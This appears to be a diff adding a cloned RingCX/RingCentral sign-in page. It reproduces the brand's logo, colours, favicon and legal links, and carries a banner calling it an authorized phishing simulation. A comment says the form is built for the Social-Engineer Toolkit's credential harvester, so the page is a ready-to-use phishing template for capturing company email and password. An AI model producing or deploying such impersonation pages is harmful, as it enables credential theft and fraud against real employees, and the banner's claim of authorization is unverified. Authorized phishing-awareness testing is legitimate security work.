@@ -1,0 +1,338 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <base href="/">
+    <title>RingCX</title>
+    <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <link rel="shortcut icon" href="https://www.ringcentral.com/etc/designs/rc-2018/favicon.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <style>
+        :root {
+            --rc-orange: #ff8800;
+            --rc-blue: #066fac;
+            --rc-blue-hover: #055a8c;
+            --rc-text: #1f1f1f;
+            --rc-muted: #6b6b6b;
+            --rc-border: #d9d9d9;
+            --rc-bg: #f5f6f7;
+            --rc-card: #ffffff;
+            --rc-error: #d93025;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: var(--rc-bg);
+            color: var(--rc-text);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .page {
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: #000;
+            color: #fff;
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.02em;
+        }
+
+        .header-logo {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: var(--rc-orange);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .header-logo svg {
+            width: 16px;
+            height: 16px;
+            fill: #fff;
+        }
+
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 16px;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 420px;
+            background: var(--rc-card);
+            border: 1px solid #e8e8e8;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.06);
+            padding: 40px 36px 32px;
+        }
+
+        .brand {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .brand-mark {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 16px;
+            border-radius: 50%;
+            background: var(--rc-orange);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .brand-mark svg {
+            width: 30px;
+            height: 30px;
+            fill: #fff;
+        }
+
+        .brand h1 {
+            margin: 0 0 6px;
+            font-size: 24px;
+            font-weight: 500;
+            line-height: 1.2;
+        }
+
+        .brand p {
+            margin: 0;
+            color: var(--rc-muted);
+            font-size: 14px;
+        }
+
+        .field {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            height: 44px;
+            padding: 0 14px;
+            border: 1px solid var(--rc-border);
+            border-radius: 4px;
+            font: inherit;
+            font-size: 15px;
+            color: var(--rc-text);
+            background: #fff;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--rc-blue);
+            box-shadow: 0 0 0 3px rgba(6, 111, 172, 0.15);
+        }
+
+        .actions {
+            margin-top: 24px;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            height: 44px;
+            border: 0;
+            border-radius: 4px;
+            background: var(--rc-blue);
+            color: #fff;
+            font: inherit;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s ease;
+        }
+
+        button[type="submit"]:hover {
+            background: var(--rc-blue-hover);
+        }
+
+        .links {
+            margin-top: 18px;
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            font-size: 13px;
+        }
+
+        .links a {
+            color: var(--rc-blue);
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 24px 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--rc-muted);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e5e5e5;
+        }
+
+        .sso-button {
+            width: 100%;
+            height: 44px;
+            border: 1px solid var(--rc-border);
+            border-radius: 4px;
+            background: #fff;
+            color: var(--rc-text);
+            font: inherit;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: var(--rc-muted);
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: var(--rc-blue);
+            text-decoration: none;
+        }
+
+        .test-banner {
+            background: #fff3cd;
+            color: #664d03;
+            border-bottom: 1px solid #ffe69c;
+            padding: 8px 16px;
+            font-size: 12px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="test-banner">
+            Authorized security testing only — credentials are captured locally for phishing simulation.
+        </div>
+
+        <header class="header">
+            <span class="header-logo" aria-hidden="true">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm0 3a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3zm-4 11.5c0-2.2 1.8-4 4-4s4 1.8 4 4v.5H8v-.5z"/>
+                </svg>
+            </span>
+            RingCX
+        </header>
+
+        <main class="main">
+            <div class="card">
+                <div class="brand">
+                    <div class="brand-mark" aria-hidden="true">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm0 3a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3zm-4 11.5c0-2.2 1.8-4 4-4s4 1.8 4 4v.5H8v-.5z"/>
+                        </svg>
+                    </div>
+                    <h1>Sign in to RingCX</h1>
+                    <p>Use your RingCentral company credentials</p>
+                </div>
+
+                <!-- SET credential harvester requires a standard HTML POST form -->
+                <form method="post" action="https://ringcx.ringcentral.com/login">
+                    <div class="field">
+                        <label for="email">Email or phone number</label>
+                        <input
+                            id="email"
+                            name="email"
+                            type="email"
+                            autocomplete="username"
+                            placeholder="name@company.com"
+                            required
+                        />
+                    </div>
+
+                    <div class="field">
+                        <label for="password">Password</label>
+                        <input
+                            id="password"
+                            name="password"
+                            type="password"
+                            autocomplete="current-password"
+                            placeholder="Enter your password"
+                            required
+                        />
+                    </div>
+
+                    <div class="actions">
+                        <button type="submit">Sign in</button>
+                    </div>
+                </form>
+
+                <div class="links">
+                    <a href="#">Forgot password?</a>
+                    <a href="#">Use SSO</a>
+                </div>
+
+                <div class="divider">or</div>
+
+                <button class="sso-button" type="button">Continue with Single Sign-On</button>
+
+                <div class="footer">
+                    By signing in, you agree to RingCentral's
+                    <a href="https://www.ringcentral.com/legal/tou.html">Terms of Use</a>
+                    and
+                    <a href="https://www.ringcentral.com/legal/privacy-notice.html">Privacy Notice</a>.
+                </div>
+            </div>
+        </main>
+    </div>
+</body>
+</html>
